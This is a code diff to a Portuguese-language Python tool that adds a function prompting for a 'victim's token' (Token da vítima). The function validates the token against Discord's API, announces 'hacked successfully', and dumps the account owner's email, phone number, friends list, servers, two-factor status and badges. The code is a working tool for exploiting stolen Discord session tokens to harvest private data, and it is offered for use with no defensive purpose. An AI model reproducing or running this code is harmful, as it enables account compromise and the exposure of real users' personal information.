@@ -1,10 +1,15 @@
 import requests, cores as c, os, re, banners, time, sys, phonenumbers as phn
+from pystyle import Colorate, Colors
+from rich.panel import Panel
+from rich.console import Console
 from phonenumbers import parse
 from phonenumbers import geocoder
 from phonenumbers import carrier
 from phonenumbers import timezone
 from pystyle import Colorate, Colors
-Versão='5.7'
+from datetime import datetime
+console=Console()
+Versão='6.0'
 def wifi():
   print(f'\nSe conectando ao {c.bblue}Vulm{c.white}...')
   url = 'https://www.google.com'
@@ -159,3 +164,170 @@ def numer():
     except:
       print(f'''\n[{c.red}!{c.white}] {c.red}Número inválido.{c.white}\n''')
       input('[ENTER] para voltar ao menu.')
+
+def CT():
+  os.system('clear')
+  print(Colorate.Vertical(Colors.blue_to_green, banners.banner2))
+  token=input(f'\n[{c.blue}>{c.white}] Token da vítima: ')
+  head = {'Authorization': str(token)}
+  src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
+  if src.status_code != 200:
+    print(f'''\n[{c.red}!{c.white}] {c.red}Token inválido.{c.white}''')
+    input('\n[ENTER] para voltar ao menu.')
+  else:
+    headers = {'Authorization': token, 'Content-Type': 'application/json'}
+    r = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
+    if r.status_code == 200:
+       os.system('clear')
+       print(Colorate.Vertical(Colors.red_to_yellow, banners.banner1))
+       print('\n[💉] Hackeado com sucesso !')
+       def get_server_names(token):
+         headers = {'Authorization': token, 'Content-Type': 'application/json'}
+         response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=headers)
+
+         server_names = [server['name'] for server in response.json()] if response.status_code == 200 else []
+
+
+         return server_names
+       name_servers=get_server_names(token)
+       def get_friend_names(token):
+        headers = {'Authorization': token, 'Content-Type': 'application/json'}
+        response = requests.get('https://discord.com/api/v10/users/@me/relationships', headers=headers)
+
+        friend_names = [friend['user']['username'] for friend in response.json() if 'user' in friend] if response.status_code == 200 else []
+
+        return friend_names
+       friend_names = get_friend_names(token)
+       def get_badges(flags):
+         badge_flags = {
+      1: "Staff",
+      2: "Partner",
+      4: "Hypesquad Events",
+      8: "Bug Hunter Level 1",
+      16: "House Bravery",
+      32: "House Brilliance",
+      64: "House Balance",
+      128: "Early Supporter",
+      256: "Team User",
+      512: "System",
+      1024: "Bug Hunter Level 2",
+      4096: "Verified Bot",
+      16384: "Early Verified Bot Developer",
+      65536: "Discord Certified Moderator"
+  }
+         badges = [badge_flags[flag] for flag in badge_flags if flag & flags]
+         return ', '.join(badges) if badges else "Sem flags"
+       linguagens = {
+  'da'    : 'Dinamarquês, Dinamarca',
+  'de'    : 'Alemão, Alemanha',
+  'en-GB' : 'Inglês, Reino Unido',
+  'en-US' : 'Inglês, Estados Unidos',
+  'es-ES' : 'Espanhol, Espanha',
+  'fr'    : 'Francês, França',
+  'hr'    : 'Croata, Croácia',
+  'lt'    : 'Lituano, Lituânia',
+  'hu'    : 'Húngaro, Hungria',
+  'nl'    : 'Holandês, Holanda',
+  'no'    : 'Norueguês, Noruega',
+  'pl'    : 'Polonês, Polônia',
+  'pt-BR' : 'Português Brasil, Brasil',
+  'ro'    : 'Romeno, Romênia',
+  'fi'    : 'Finlandês, Finlândia',
+  'sv-SE' : 'Sueco, Suécia',
+  'vi'    : 'Vietnamita, Virtna',
+  'tr'    : 'Turco, Turquia',
+  'cs'    : 'Tcheco, República Tcheca',
+  'el'    : 'Grego, Grécia',
+  'bg'    : 'Búlgaro, Bulgária',
+  'ru'    : 'Russo, Russia',
+  'uk'    : 'Ucraniano, Ucrânia',
+  'th'    : 'Tailandês, Tailândia',
+  'zh-CN' : 'Chinês, China',
+  'ja'    : 'Japonês, Japão',
+  'zh-TW' : 'Chinês, Taiwan',
+  'ko'    : 'Coreano, Coreia'
+           }
+       friend_names_text = '\n'.join(friend_names) if friend_names else '  [cyan]Nenhum amigo encontrado.[white]'
+       server_names_text = '\n'.join(name_servers) if name_servers else '  [cyan]Nenhum servidor encontrado.[white]'
+       userName = r.json()['username'] + '#' + r.json()['discriminator']
+       userID = r.json()['id']
+       name = r.json()['global_name']
+       vatar = r.json()['avatar']
+       avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{vatar}.webp'
+       accent_color = r.json()['accent_color']
+       phone = r.json()['phone']
+       email = r.json()['email']
+       mfa = r.json()['mfa_enabled']
+       flags = r.json()['flags']
+       verem = r.json()['verified']
+       locale = r.json()['locale']
+       pl = linguagens.get(locale)
+       badges = get_badges(flags)
+       nitro = r.json()['premium_type']
+       Cdate = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime('%d/%m/%Y %H:%M:%S UTC')
+       print(f'\n[🧪] Token: {token}\n')
+       if mfa==True:
+        mfa='Sim'
+       else:
+         mfa='Não'
+       if verem==True:
+         verem='Sim'
+       else:
+         verem='Não'
+       if nitro==1:
+         nitro='Nitro Classic'
+       elif nitro==2:
+          nitro='Nitro'
+       elif nitro==3:
+         nitro='Nitro Basic'
+       else:
+         nitro='Sem nitro'
+       if vatar==None:
+         avatar_url='Sem foto de perfil (ícone padrão do Discord)'
+       console.print(Panel.fit(f'''
+<<───────────Info básicas 🧾───────────>>
+
+[blue]ID do usuário :[white] {userID}
+
+[blue]Nome de usuário :[white] {userName}
+[blue]Nome exebido :[white] {name}
+
+[blue]Ícone do perfil :[white] {avatar_url}
+
+[blue]Entrou no discord em :[white] {Cdate}
+
+[blue]Língua :[white] {locale} ({pl})
+
+[blue]Cor do banner :[white] {'(HEX) '+str(accent_color) if accent_color else "Automático"}
+
+[blue]↓ Amigos ↓[white]
+
+{friend_names_text}
+
+[blue]↓ Servidores que o usuário participa ↓[white]
+
+{server_names_text}
+
+
+<<──────────────Nitro 🚀──────────────>>
+
+[blue]Nitro :[white] {nitro}
+
+<<────────────Seguraça 🔐────────────>>
+
+[blue]Possui verificação de 2 fatores ? :[white] {mfa}
+
+[blue]O email é verificado pelo discord ? :[white] {verem}
+
+ <<──────────Flags ⛳───────────>>
+
+[blue]Flags : [white]{badges}
+
+ <<────────────Contato 📫────────────>>
+
+[blue]Email :[white] {email}
+
+[blue]Número de telefone :[white] {phone if phone else "[cyan]Não registrado[white]"}
+
+''', title='🛰️'))
+       input('\n[ENTER] para voltar ao menu.')
